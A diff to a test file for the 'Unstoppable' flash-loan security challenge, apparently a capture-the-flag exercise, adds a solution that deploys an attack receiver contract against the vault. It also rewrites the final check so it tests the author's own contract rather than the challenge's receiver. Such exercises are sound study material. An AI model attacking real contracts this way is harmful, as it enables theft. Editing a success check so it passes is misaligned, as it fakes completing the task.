@@ -3,7 +3,7 @@ const { expect } = require('chai');
 
 describe('[Challenge] Unstoppable', function () {
     let deployer, player, someUser;
-    let token, vault, receiverContract;
+    let token, vault, receiverContract,attack_receiverContract;
 
     const TOKENS_IN_VAULT = 1000000n * 10n ** 18n;
     const INITIAL_PLAYER_TOKEN_BALANCE = 10n * 10n ** 18n;
@@ -45,6 +45,10 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        attack_receiverContract = await (await ethers.getContractFactory('AttackReceiverUnstoppable', player)).deploy(
+            vault.address
+        );
+        await attack_receiverContract.connect( player).executeFlashLoan(100n * 10n ** 18n);
     });
 
     after(async function () {
@@ -52,7 +56,7 @@ describe('[Challenge] Unstoppable', function () {
 
         // It is no longer possible to execute flash loans
         await expect(
-            receiverContract.executeFlashLoan(100n * 10n ** 18n)
+            attack_receiverContract.executeFlashLoan(100n * 10n ** 18n)
         ).to.be.reverted;
     });
 });
